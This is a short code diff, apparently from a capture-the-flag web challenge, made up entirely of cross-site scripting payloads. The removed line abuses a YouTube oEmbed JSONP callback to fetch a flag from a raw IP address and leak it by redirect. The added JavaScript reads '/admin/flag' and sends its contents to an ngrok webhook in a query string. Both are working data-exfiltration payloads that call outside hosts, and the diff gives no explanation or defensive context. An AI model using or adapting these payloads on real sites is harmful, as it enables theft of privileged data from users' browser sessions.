@@ -1,1 +1,16 @@
-<script src="https://youtube.com/oembed?callback=fetch(%27http://165.232.190.5:2000/flag%27).then(function(response)%7Breturn response.text();}).then(function(data) {document.location =/${data}});"></script>
+async function sendFlagToWebhook(webhookUrl) {
+  try {
+    const response = await fetch('/admin/flag');
+    const data = await response.text();
+    console.log(data);
+
+    const encodedData = encodeURIComponent(data);
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
+
+    document.location = urlWithQueryParams;
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+sendFlagToWebhook('https://2b66-49-36-190-235.ngrok-free.app');
